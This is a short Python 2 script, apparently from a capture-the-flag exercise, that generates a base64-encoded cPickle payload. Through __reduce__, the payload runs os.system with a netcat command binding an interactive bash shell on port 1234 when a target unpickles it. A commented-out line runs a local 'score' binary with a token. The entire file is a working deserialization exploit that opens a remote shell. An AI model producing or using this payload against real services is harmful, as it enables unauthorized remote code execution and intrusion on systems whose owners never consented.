# This must be run as python2 beacuse of the cPickle.
# Regular pickle doesnt have the same outcome. 


import cPickle
import os
import base64

class Blah(object):
  def __reduce__(self):
    return (os.system,(
      "netcat -c '/bin/bash -i' -l -p 1234 ",))
    # return (os.system,("/usr/local/bin/score b691b7cf-e394-46cf-ba87-7f986fc25c08",))

# b = Blah()

# print(cPickle.dumps(Blah()))
print(base64.b64encode(cPickle.dumps(Blah())))
